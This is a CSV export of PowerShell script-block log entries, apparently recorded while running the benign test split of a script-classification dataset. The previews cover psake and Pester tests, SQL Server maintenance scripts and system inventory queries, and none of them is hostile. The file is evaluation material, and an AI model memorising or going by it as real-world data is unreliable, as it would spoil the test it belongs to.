"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 9:13:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:13:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:13:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:13:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\2945.ps1","139","Framework '4.0x86'; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {}; else {; exec { msbuild /version }; }; }"
"8/6/2026 9:12:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\2939.ps1","224","task default -depends Test; task Test -depends Compile, Clean -PreAction {""Pre-Test""} -Action {; Assert $false ""This fails.""; } -PostAction {""Post-Test""}; task Compile -depends Clean {; ""Compile""; }; "
"8/6/2026 9:12:47 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:12:47 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:12:47 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:12:47 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:12:47 AM","C:\TA\project-ta\data_spliting\test_set\benign\2923.ps1","608","task default -depends Test; task Test -depends Compile, Clean {; Assert $false ""This fails.""; }; task Compile -depends Clean {; ""Compile""; }; task Clean {; ""Clean""; }; taskTearDown {; param($task); As"
"8/6/2026 9:12:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\2914.ps1","213","Framework ""1.1.0""; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {; $output = &dotnet build -version -nologo 2>&1; Assert ($output -NotLike ""15.1"") '$output should contai"
"8/6/2026 9:12:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:12:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:12:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:12:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:12:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\2911.ps1","368","Properties {; [string]$testProperty = ""Test123""; }; BuildTearDown {; [string]$expected = ""Test123""; if ($testProperty -ne $expected) {; throw ""Expected '$expected', but was actually '$testProperty'""; "
"8/6/2026 9:12:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\2903.ps1","247","Framework '3.5'; task default -depends AspNetCompiler; task AspNetCompiler {; if ( $IsMacOS -OR $IsLinux ) {}; else {; aspnet_compiler; if ($LastExitCode -ne 1) {; throw 'Error: Could not execute aspn"
"8/6/2026 9:12:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:12:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:12:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:12:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:12:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\2900.ps1","376","Properties {; [string]$testProperty = ""Test123""; }; BuildSetup {; [string]$expected = ""Test123""; if ($testProperty -ne $expected) {; throw ""Expected sequence '$expected', but was actually '$testProper"
"8/6/2026 9:12:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\2897.ps1","471","properties {; $container = @{}; $container.foo = ""foo""; $container.bar = $null; $foo = 1; $bar = 1; }; task default -depends TestInit; task TestInit {; Assert ($container.foo -eq ""foo"") ""$container.fo"
"8/6/2026 9:11:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:11:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:11:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:11:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:11:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\2891.ps1","248","Task default -Depends RunWhatIf; Task RunWhatIf {; try {; $global:WhatIfPreference = $true; $parameters = @{p1='whatifcheck';}; Invoke-psake .\nested\whatifpreference.ps1 -parameters $parameters; } fi"
"8/6/2026 9:11:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\2885.ps1","215","Framework '4.7'; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {}; else {; $output = &msbuild /version /nologo 2>&1; Assert ($output -NotLike '15.0') '$output should cont"
"8/6/2026 9:11:43 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:11:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:11:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:11:42 AM","C:\TA\project-ta\data_spliting\test_set\benign\2865.ps1","230","task default -depends test; task test {; Push-Location 'missing_build_file'; $result = invoke-psake -Docs | Out-String; Pop-Location; Assert ($result -match 'adefaulttask') 'Default build file should "
"8/6/2026 9:11:35 AM","","9","$global:?"
"8/6/2026 9:11:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\2816.ps1","54","{ $_.StartMode -eq ""Auto"" -or $_.State -eq ""Running"" }"
"8/6/2026 9:11:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\2816.ps1","153","; $data = $null; foreach ($file in (ls *svcall.xml)) {; $data += Import-Clixml $file; }; $data | ? { $_.StartMode -eq ""Auto"" -or $_.State -eq ""Running"" }"
"8/6/2026 9:11:27 AM","C:\TA\project-ta\data_spliting\test_set\benign\2758.ps1","96","; Update-TypeData -TypeName System.Diagnostics.Process -SerializationDepth 3 -Force; Get-Process"
"8/6/2026 9:11:19 AM","","8804","idateNotNull()]
    [timespan[]]
    ${ValidLifetime},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [ValidateNotNull()]
    [timespan[]]
    ${PreferredLifetime},

    [Parameter(Pa"
"8/6/2026 9:11:19 AM","","12591","arameter(ParameterSetName='InputObject (cdxml)')]
    [byte]
    ${PrefixLength},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    ["
"8/6/2026 9:11:19 AM","","12591","reate', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
        }
    }

          "
"8/6/2026 9:11:19 AM","","12591","pe = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cm"
"8/6/2026 9:11:19 AM","","12591","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:11:19 AM","","4573","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/StandardCimv2/"
"8/6/2026 9:11:19 AM","C:\TA\project-ta\data_spliting\test_set\benign\2747.ps1","14","; Get-NetRoute"
"8/6/2026 9:11:11 AM","","9","$global:?"
"8/6/2026 9:11:11 AM","C:\TA\project-ta\data_spliting\test_set\benign\2729.ps1","229","$ErrorActionPreference = ""SilentlyContinue""; $o = """" | Select-Object IISInstalled; if ((Get-ItemProperty HKLM:\Software\Microsoft\InetStp\Components\).W3SVC) {; $o.IISInstalled = ""True""; } else {; $o."
"8/6/2026 9:11:04 AM","","9","$global:?"
"8/6/2026 9:11:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\2725.ps1","80","{; $obj | Add-Member NoteProperty .NET_$i $_.VersionInfo.ProductVersion; $i++; }"
"8/6/2026 9:11:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\2725.ps1","352","; $obj = """" | Select-Object $($PSVersionTable.Keys); foreach($item in $PSVersionTable.Keys) {; $obj.$item = $($PSVersionTable[$item] -join "".""); }; $i = 1; Get-ChildItem -Force ""$($env:windir)\Microso"
"8/6/2026 9:10:56 AM","","9","$global:?"
"8/6/2026 9:10:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\2723.ps1","88","Get-WmiObject -Namespace root\Microsoft\SecurityClient -Class AntimalwareInfectionStatus"
"8/6/2026 9:10:48 AM","C:\TA\project-ta\data_spliting\test_set\benign\2722.ps1","319","if (Test-Path ""$env:SystemRoot\clrver.exe"") {; $counter = 0; & $env:SystemRoot\clrver.exe -all 2> $null | `; ConvertFrom-Csv -Delimiter `t -Header ""PID"",""ProcessName"",""CLR Version"" | `; ForEach-Object"
"8/6/2026 9:10:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\2720.ps1","263","; $ErrorActionPreference = ""Continue""; Try {; Push-Location; Set-Location Cert:; ls -r * | Select-Object PSParentPath,FriendlyName,NotAfter,NotBefore,SerialNumber,Thumbprint,Issuer,Subject; } Catch {;"
"8/6/2026 9:10:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\2641.ps1","609","$dbs = Invoke-Sqlcmd -ServerInstance localhost -Database tempdb -Query ""SELECT name FROM sys.databases WHERE database_id != 2 and state_desc = 'ONLINE'""; $datestring =  (Get-Date -Format 'yyyyMMddHHmm"
"8/6/2026 9:10:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:10:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:10:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:10:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:10:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\2639.ps1","1196","param([string] $ServerInstance); $smosrv = New-Object Microsoft.SqlServer.Management.Smo.Server $ServerInstance; $jobs = @('BackupDBs-FULL','BackupDBs-LOGS'); foreach($job in $jobs){; $j = New-Object "
"8/6/2026 9:10:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:10:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:10:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\2622.ps1","1208","Import-Module C:\git-repositories\PowerShell\MSFVMLab\MSFVMLab.psm1 -Force; $LabConfig = Get-Content C:\git-repositories\PowerShell\MSFVMLab\LabVMS.json | ConvertFrom-Json; $WorkingDirectory = $LabCon"
"8/6/2026 9:10:08 AM","","9","$global:?"
"8/6/2026 9:10:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:10:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:10:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:10:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:10:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\2600.ps1","984","[System.Reflection.Assembly]::LoadWithPartialName(""Microsoft.SqlServr.Rmo""); $servername = ""STGSQL610""; $repserver = New-Object ""Microsoft.SqlServer.Replication.ReplicationServer""; $srv = New-Object """
"8/6/2026 9:09:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\2569.ps1","1323","$Database = ""dbamaint""; $Server = ""PSQLPA24""; $SMTPServer = ""smtp.domain.com""; $AttachmentPath = ""C:\Dexma\Logs\output.csv""; $SqlQuery = ""exec sel_TRNSizing""; $SqlConnection = New-Object System.Data.S"
"8/6/2026 9:09:51 AM","","9","$global:?"
"8/6/2026 9:09:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\2542.ps1","520","$a = ""XSQLUTIL18"", ""XSQLUTIL19""; $a | % `; {; $ServerName = $_;; cd sqlserver:\; cd sql\$ServerName\default\databases; $DBs = dir;; $DBs | % `; {; $LastBackupDate = $_.LastBackupDate;; $LastLogBackupD"
"8/6/2026 9:09:43 AM","C:\TA\project-ta\data_spliting\test_set\benign\2535.ps1","1166","; $LastDayOfMonth = (Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day 1 -DisplayHint Date).AddMonths(1).AddDays(-1); Write-Host ($lastDayOfMonth).Date; $DateDiff1 = New-TimeSpan $(Get-Date "
"8/6/2026 9:09:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:36 AM","C:\TA\project-ta\data_spliting\test_set\benign\2533.ps1","247","param($fileFilter=$(throw ""Filter must be specified"")); $regex = [regex]""^(?<Program>\S*)\s*pid: (?<PID>\d*)\s*type: (?<Handle>\S*)\s*\w*: (?<File>((\\\\).*|([a-zA-Z]:).*))""; E:\Dexma\bin\ThirdParty\h"
"8/6/2026 9:09:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\2367.ps1","852","$aOutput = @();; $aDisabledGpos = Get-GPO -All | Where-Object { $_.GpoStatus -eq 'AllSettingsDisabled' };; foreach ($oGpo in $aDisabledGpos) {; $oOutput = New-Object System.Object;; $oOutput | Add-Mem"
"8/6/2026 9:09:20 AM","","9","$global:?"
"8/6/2026 9:09:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\2352.ps1","871","Import-Module ActiveDirectory; try {; $uap_docs = Import-Csv C:\scripts\All-Doc-2013-Password-Policy\all-docs-2013-password-policy.csv; $ad_pw_ages = @();; foreach ($user in $uap_docs) {; $ad_pw_ages "
"8/6/2026 9:09:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\2339.ps1","3191","[xml]$golden_gpo = gc '.\IE Settings.xml'; $gpos = Get-GPOReport -All -ReportType XML; $golden_gpo_computer_registry_settings = ($golden_gpo.GPO.Computer.ExtensionData | ? {$_.Name -eq 'Registry'}).ch"
"8/6/2026 9:09:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\2145.ps1","882","Describe 'Automatic variable $input' -Tags ""CI"" {; It '$input Type should be enumerator' -Skip {; function from_begin { [cmdletbinding()]param() begin { Write-Output -NoEnumerate $input } }; function "
"8/6/2026 9:08:56 AM","C:\TA\project-ta\data_spliting\test_set\benign\2136.ps1","7608","Describe ""Range Operator"" -Tags CI {; Context ""Range integer operations"" {; It ""Range operator generates arrays of integers"" {; $Range = 5..8; $Range.count | Should -Be 4; $Range[0] | Should -BeOfType"
"8/6/2026 9:08:48 AM","C:\TA\project-ta\data_spliting\test_set\benign\2125.ps1","1172","Describe ""Test trap"" -Tags ""CI"" {; Context ""Trap with flow control"" {; It ""Line after exception should NOT be continued when it's from a nested script block"" {; $a = . {trap {""trapped""; continue;}; . "
"8/6/2026 9:08:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\2110.ps1","4599","Describe ""ArrayExpression Tests"" -Tags ""CI"" {; It ""@([object[]](1,2,3)) should return a 3-element array of object[]"" {; $result = @([object[]](1,2,3)); $result.GetType().FullName | Should -BeExactly """
"8/6/2026 9:08:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\2064.ps1","4023","Describe ""Language Primitive Tests"" -Tags ""CI"" {; It ""Equality comparison with string and non-numeric type should not be culture sensitive"" {; $date = [datetime]'2005,3,10'; $val = [System.Management."
"8/6/2026 9:08:24 AM","","9","$global:?"
"8/6/2026 9:08:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:08:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:08:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:08:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:08:24 AM","C:\TA\project-ta\data_spliting\test_set\benign\2051.ps1","3164","try {; $defaultParamValues = $PSdefaultParameterValues.Clone(); $PSDefaultParameterValues[""it:skip""] = ![System.Management.Automation.Platform]::IsWindowsDesktop; Describe 'Basic COM Tests' -Tags ""CI"""
"8/6/2026 9:08:16 AM","C:\TA\project-ta\data_spliting\test_set\benign\2044.ps1","4607","Describe ""Telemetry for shell startup"" -Tag CI {; BeforeAll {; $cacheDir = [System.Management.Automation.Platform].GetField(""CacheDirectory"",""NonPublic,Static"").GetValue($null); $uuidPath = Join-Path "
"8/6/2026 9:08:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:08:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:08:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:08:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:08:08 AM","C:\TA\project-ta\data_spliting\test_set\benign\2016.ps1","209",". ""$psscriptroot/TestRunner.ps1""; $AssemblyName = ""Microsoft.PowerShell.ConsoleHost""; $excludeList = @(""HostMshSnapinResources.resx""); Test-ResourceStrings -AssemblyName $AssemblyName -ExcludeList $ex"
"8/6/2026 9:08:00 AM","C:\TA\project-ta\data_spliting\test_set\benign\1984.ps1","861","Describe ""New-Event"" -Tags ""CI"" {; Context ""Check return type of New-Event"" {; It ""Should return PSEventArgs as return type of New-Event"" {; New-Event -SourceIdentifier a | Should -BeOfType System.Man"
"8/6/2026 9:07:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\1972.ps1","1664","Describe ""Remove-PSBreakpoint"" -Tags ""CI"" {; $testScript = Join-Path -Path (Join-Path -Path $PSScriptRoot -ChildPath assets) -ChildPath psbreakpointtestscript.ps1; $script = ""`$var = 1; `$var2 = Get-C"
"8/6/2026 9:07:43 AM","C:\TA\project-ta\data_spliting\test_set\benign\1938.ps1","773","Describe ""Measure-Command"" -Tags ""CI"" {; Context ""Validate return types for Measure-Command"" {; It ""Should return TimeSpan as the return type"" {; Measure-Command { Get-Date } | Should -BeOfType timesp"
"8/6/2026 9:07:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:07:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:07:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:07:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:07:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\1929.ps1","692","Import-Module HelpersCommon; Describe ""Set-Date for admin"" -Tag @('CI', 'RequireAdminOnWindows', 'RequireSudoOnUnix') {; It ""Set-Date should be able to set the date in an elevated context"" -Skip:(Test"
